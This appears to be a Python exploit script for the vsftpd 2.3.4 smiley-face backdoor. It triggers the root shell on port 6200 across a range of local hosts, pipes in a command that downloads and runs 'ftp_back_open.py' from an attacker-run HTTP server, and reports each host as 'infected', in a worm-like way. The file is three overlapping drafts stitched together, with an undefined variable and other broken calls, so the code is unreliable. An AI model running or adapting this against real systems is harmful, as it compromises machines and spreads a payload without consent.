import ftplib
import subprocess
import shlex
import time 


FTP_HOST = "192.168.1.60"
FTP_USER = "user:)"
FTP_PASS = "pass"

start_server = "python3 -m http.server 80"
start_server_cmd = shlex.split( start_server)
http_server = subprocess.Popen(start_server_cmd , shell=False)


#processes=[]

getfile = """ python3 -c 'import requests; url = "http://192.168.1.77/ftp_back_open.py";print(url); response = requests.get(url); f=open("/root/ftp_back_open.py","wb");f.write(response.content)' \n"""
run_file= 'python3 /root/ftp_back_open.py'


nc_cmd = 'nc 192.168.1.60 6200'
#nc_cmd = shlex.split(nc)

try:
    print("opening ", FTP_HOST)
    ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS, timeout=3)
    ftp.quit()

except:
    print("do not worry") 

finally:

    print("quitted")
    cmd = shlex.split(nc_cmd)
    sub = subprocess.Popen(cmd , shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(10)
    sub.stdin.write(getfile.encode())
    sub.stdin.flush()

    time.sleep(10)
    #result.terminate()
    print(sub)
    '''
        print("opened ", FTP_HOST, "with", nc)
        #processes.append(subprocess.Popen(nc_cmd , shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE))
        sub = subprocess.Popen(nc_cmd , shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        time.sleep(10)
        print("back connected")
        sub.stdin.write(getfile.encode())
        #processes[-1].stdin.write(getfile.encode())
        print("infected")

        time.sleep(5)
        # sub.stdin.write(run_file.encode())
        #processes[-1].stdin.write(run_file.encode())
    '''
sub.communicate
print("we")
for proc in processes:
    proc.terminate()









HOST = "192.168.1."
FTP_USER = "user:)"
FTP_PASS = "pass"


start_server = "python3 -m http.server 80"
start_server_cmd = shlex.split( start_server)
http_server = subprocess.Popen(start_server_cmd , shell=False)
time.sleep(10)

processes=[]

getfile = """ python3 -c 'import requests; url = "http://192.168.1.77/ftp_back_open.py";print(url); response = requests.get(url); f=open("/root/ftp_back_open.py","wb");f.write(response.content)' \n"""
run_file= 'python3 /root/ftp_back_open.py'
for i in range(10,61,10):
    FTP_HOST = HOST + str(i)
    nc = 'nc 192.168.1.' + str(i) + ' 6200'
    nc_cmd = shlex.split(nc)
    
    try:
        print("opening ", FTP_HOST)
        ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS, timeout=3)
        ftp.quit()

    except Exception as e:
        print("do not worry", e) 

    finally:
        try:
            print("opened ", FTP_HOST, "with", nc)
            processes.append(subprocess.Popen(nc_cmd , shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE))
            #sub = subprocess.Popen(nc_cmd , shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            
            print("back connected")
            #sub.stdin.write(getfile.encode())
            processes[-1].stdin.write(getfile.encode())
    
            processes[-1].stdin.flush()
            time.sleep(3)

            processes[-1].stdin.write(run_file.encode())
            processes[-1].stdin.flush()
            print("infected")

            time.sleep(5)
           # sub.stdin.write(run_file.encode())
            
        except Exception as ex:
            print(e)    
time.sleep(10)
http_server.terminate()
for proc in processes:
    proc.terminate()
    

FTP_HOST = "192.168.1.60"
FTP_USER = "user:)"
FTP_PASS = "pass"
start_server = "python3 -m http.server 80"
start_server_cmd = shlex.split( start_server)
http_server = subprocess.Popen(start_server_cmd , shell=False)
#getfile = """nc 192.168.1.60 6200; echo a; python3 -c "import requests; url = "http://192.168.1.77/ftp_back_open.py"; response = requests.get(url); f=open("ftp_back_open.py","w");f.write(response.content)" """
nc_cmd = 'nc 192.168.1.60 6200'
getfile = """ python3 -c 'import requests; url = "http://192.168.1.77/ftp_back_open.py";print(url); response = requests.get(url); f=open("/root/ftp_back_open.py","wb");f.write(response.content)' """
try:
    ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS, timeout=3)

    ftp.quit()

except:
    print("do not worry")    
finally:    
    print("quitted")
    cmd = shlex.split(nc_cmd)
    sub = subprocess.Popen(cmd , shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(10)
    sub.stdin.write(getfile.encode())
    #print(sub.stdout.read())
   # time.sleep(10)
    #result.terminate()
    print(sub)
